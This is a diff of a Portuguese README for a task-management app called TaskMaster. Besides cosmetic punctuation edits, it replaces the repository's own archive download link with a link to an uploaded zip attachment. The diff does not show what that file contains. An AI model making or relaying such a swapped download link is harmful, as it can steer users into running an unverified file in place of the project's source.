@@ -14,23 +14,23 @@
 
 # :hammer: Funcionalidades do projeto
 
-- `Registro e Login`: Crie sua conta rapidamente e acesse suas tarefas de qualquer lugar.
-- `Cadastro de Tarefas`: Adicione novas tarefas de forma simples, com opções para definir uma data limite e prioridades.
-- `Edição de Tarefas`: Atualize os detalhes das suas tarefas a qualquer momento, mantendo suas informações sempre precisas.
-- `Exclusão de Tarefas`: Remova tarefas concluídas ou desnecessárias para manter sua lista organizada.
-- `Pesquisa de Tarefas`: Encontre rapidamente tarefas específicas utilizando a funcionalidade de pesquisa.
-- `Filtragem de Tarefas`: Filtre suas tarefas por prioridade.
+- `Registro e Login` Crie sua conta rapidamente e acesse suas tarefas de qualquer lugar.
+- `Cadastro de Tarefas` Adicione novas tarefas de forma simples, com opções para definir uma data limite e prioridades.
+- `Edição de Tarefas` Atualize os detalhes das suas tarefas a qualquer momento, mantendo suas informações sempre precisas.
+- `Exclusão de Tarefas` Remova tarefas concluídas ou desnecessárias para manter sua lista organizada.
+- `Pesquisa de Tarefas` Encontre rapidamente tarefas específicas utilizando a funcionalidade de pesquisa.
+- `Filtragem de Tarefas` Filtre suas tarefas por prioridade.
 
 # 📁 Acesso ao projeto
 
-**Você pode <a href="https://github.com/matholv512/TaskMaster">acessar o código fonte do projeto</a> ou <a href="/matholv512/TaskMaster/archive/refs/heads/main.zip">baixá-lo</a>.**
+**Você pode <a href="https://github.com/matholv512/TaskMaster">acessar o código fonte do projeto</a> ou [baixá-lo](https://github.com/user-attachments/files/15587124/TaskMaster-main.zip).**
 
 # 🛠️ Abrir e rodar o projeto
 <p>Após baixar o projeto, abra com o Visual Studio Code.</p>
 <p>E digite no terminal os seguintes comandos:</p>
 <ul>
   <li>npm install (Para baixar a node_modules)</li>
-  <li>npm start (Para startar o projeto)</li>
+  <li>npm start (Para startar o node)</li>
   <li>npm run dev (Para startar o webpack)</li>
 </ul>
 
